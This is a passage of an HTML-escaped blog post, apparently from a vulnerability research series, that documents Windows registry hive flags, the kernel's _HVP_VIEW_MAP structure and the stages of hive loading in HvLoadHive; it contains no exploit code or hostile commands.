 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HIVE_FILE_PAGES_MUST_BE_KEPT_LOCAL&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x800000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Below is a one-liner explanation of each flag:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_d8jkcmfkq4n7-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HIVE_VOLATILE:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the hive exists in memory only; set, e.g., for \Registry and \Registry\Machine\HARDWARE.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HIVE_NOLAZYFLUSH:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;changes to the hive aren&amp;#39;t automatically flushed to disk and require a manual flush; set, e.g., for \Registry\Machine\SAM.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HIVE_PRELOADED:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the hive is one of the default, system ones; set, e.g., for \Registry\Machine\SOFTWARE, \Registry\Machine\SYSTEM, etc.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HIVE_IS_UNLOADING:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the hive is currently being loaded or unloaded in another thread and shouldn&amp;#39;t be accessed before the operation is complete.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HIVE_COMPLETE_UNLOAD_STARTED:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the unloading process of the hive has started in CmpCompleteUnloadKey.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HIVE_ALL_REFS_DROPPED:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;all references to the hive through KCBs have been dropped.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HIVE_ON_PRELOADED_LIST:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the hive is linked into a linked-list via the PreloadedHiveList field.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HIVE_FILE_READ_ONLY:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the underlying hive file is read-only and shouldn&amp;#39;t be modified; indicates that the hive was loaded with the REG_OPEN_READ_ONLY flag set.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HIVE_SECTION_BACKED:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the hive is mapped in memory using section views.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HIVE_DIFFERENCING:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the hive is a differencing one (version 1.6, loaded under \Registry\WC).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HIVE_IMMUTABLE:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the hive is immutable and cannot be modified; indicates that it was loaded with the REG_IMMUTABLE flag set.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HIVE_FILE_PAGES_MUST_BE_KEPT_LOCAL:&lt;/span&gt;&lt;span&gt;&amp;nbsp;the kernel always maintains a local copy of every page of the hive, either by locking it in physical memory or creating a private copy through the CoW mechanism.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.ux798jmnhi90&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Log file information&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Between offsets 0xA4 to 0xCC, there are a number of fields having to do with log file management, i.e. the .LOG1/.LOG2 files accompanying the main hive file on disk.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.fewd19kauta6&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Hive version&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;The Version field stores the minor version of the hive, which should theoretically be an integer between 3&amp;ndash;6. However, as mentioned in the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html&quot;&gt;previous blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;, it is possible to set it to an arbitrary 32-bit value either by specifying a major version equal to 0 and any desired minor version, or by enticing the kernel to recover the hive header from a log file, and abusing the fact that the HvAnalyzeLogFiles function is more permissive than HvpGetHiveHeader. Nevertheless, I haven&amp;#39;t found any security implications of this behavior.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.df4nnolbvj1t&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;View map&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The view map holds all the essential information about how the hive is mapped in memory. The specific implementation of registry memory management has evolved considerably over the years, with its details changing between consecutive system versions. In the latest ones, the view map is represented by the top-level _HVP_VIEW_MAP public structure:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HVP_VIEW_MAP&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;nt!_HVP_VIEW_MAP&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;SectionReference&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Void&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;StorageEndFileOffset&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Int8B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x010&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;SectionEndFileOffset&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Int8B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x018&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ProcessTuple&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CMSI_PROCESS_TUPLE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x020&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x028&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ViewTree&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_RTL_RB_TREE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The semantics of its respective fields are as follows:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_yqb7oqt8gv0c-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;SectionReference:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Contains a kernel-mode handle to a section object corresponding to the hive file, created via ZwCreateSection in CmSiCreateSectionForFile.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;StorageEndFileOffset:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Stores the maximum size of the hive that can be represented with file-backed sections at any given time. Initially set to the size of the loaded hive, it can dynamically increase or decrease at runtime for mutable (normal) hives.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;SectionEndFileOffset:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Represents the size of the hive file section at the time of loading. It is never modified past the first initialization in HvpViewMapStart, and seems to be mostly used as a safeguard against extending an immutable hive file beyond its original size.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;ProcessTuple:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;A structure of type _CMSI_PROCESS_TUPLE, it identifies the host process of the hive&amp;#39;s section views. This field currently always points to the global CmpRegistryProcess object, which corresponds to the dedicated &amp;quot;Registry&amp;quot; process that hosts all hive mappings in the system. However, this field could enable a more fine-grained separation of hive mappings across multiple processes, should Microsoft choose to implement such a feature.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Flags:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Represents a set of memory management flags relevant to the entire hive. &lt;/span&gt;&lt;span&gt;These flags are not publicly documented; however, through reverse engineering, I have determined their purpose&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;to be as follows:&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_yqb7oqt8gv0c-1 start&quot;&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c0 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;VIEW_MAP_HIVE_FILE_IMMUTABLE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;(0x1): Indicates that the hive has been loaded as immutable, meaning no data is ever saved back to the underlying hive file.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c0 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;VIEW_MAP_MUST_BE_KEPT_LOCAL&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;(0x2): Indicates that all of the hive data must be persistently stored in memory, and not just accessible through file-backed sections. This is likely to protect against double-fetch conditions involving hives loaded from remote network shares.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c0 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;VIEW_MAP_CONTAINS_LOCKED_PAGES&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;(0x4): Indicates that some of the hive&amp;#39;s pages are currently locked in physical memory using ZwLockVirtualMemory.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_yqb7oqt8gv0c-0&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;ViewTree:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;This is the root of a view tree structure, which contains the descriptors of each continuous section view mapped in memory.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Overall, the implementation of low-level hive memory management in Windows is more complex than might initially seem necessary. This complexity arises from the kernel&amp;#39;s need to gracefully handle a variety of corner cases and interactions. For example, hives may be loaded as immutable, which indicates that the hive may be operated on in memory, but changes must not be flushed to disk. Simultaneously, the system must support recovering data from .LOG files, including the possibility of extending the hive beyond its original on-disk length. At runtime, it must also be possible to efficiently modify the registry data, as well as shrink and extend it on demand. To further complicate matters, Windows enforces different rules for locking hive pages in memory depending on the backing volume of the file, carefully balancing optimal memory usage and system security guarantees. These and many other factors collectively contribute to the complexity of hive memory management.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;To better understand how the view tree is organized, let&amp;#39;s first analyze the general logic of the hive mapping code.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;tTszyzmaCA-c56 tTszyzmaCA-c13&quot; id=&quot;h.qmae2irv9oe&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c36 tTszyzmaCA-c4&quot;&gt;The hive mapping logic&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The main kernel function responsible for mapping a hive in memory is HvLoadHive. It implements the overall logic and coordinates various sub-routines responsible for performing more specialized tasks, in the following order:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_iwbl6bi5grxz-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Header Validation:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;The kernel reads and inspects the hive&amp;#39;s header to ascertain its integrity, ensuring that the hive has not been tampered with or corrupted. Relevant function: HvpGetHiveHeader.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Log Analysis:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;The kernel processes the hive&amp;#39;s transaction logs, scrutinising them to identify any pending changes or inconsistencies that necessitate recovery procedures. Relevant function: HvAnalyzeLogFiles.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Initial Section Mapping:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;A section object is created based on the hive file, and further segmented into multiple views, each aligned to 4 KiB boundaries and capped at 2 MiB. At this point, the kernel prioritizes the creation of an initial mapping without focusing on the granular layout of individual bins within the hive. Relevant function: HvpViewMapStart.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Cell Map Initialization:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;The cell map, a component that translates cell indexes to memory address, is initialized. Its entries are configured to point to the newly created views. Relevant function: HvpMapHiveImageFromViewMap.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Log Recovery (if required):&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;If the preceding log analysis reveals the need for data recovery, the kernel attempts to restore data integrity. This is the earliest point at which the newly created memory mappings may already be modified and marked as &amp;quot;dirty&amp;quot;, indicating that their contents have been altered and require synchronisation with the on-disk representation. Relevant function: HvpPerformLogFileRecovery.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Bin Mapping:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;In this final stage, the kernel establishes definitive memory mappings for each bin within the hive, ensuring that each bin occupies a contiguous region of memory. This process may necessitate creating new views, eliminating existing ones, or adjusting their boundaries to accommodate the specific arrangement of bins. Relevant function: HvpRemapAndEnlistHiveBins.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;Now that we understand the primary components of the loading process, we can examine the internal structure of the section view tree in more detail.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;tTszyzmaCA-c13 tTszyzmaCA-c56&quot; id=&quot;h.l82a8hg8xrtg&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c36&quot;&gt;The view tree&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Let&amp;#39;s consider an example hive consisting of three bins of sizes 256 KiB, 2 MiB and 128 KiB, respectively. After step 3 (&amp;quot;Initial Section Mapping&amp;quot;), the section views created by the kernel are as follows:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
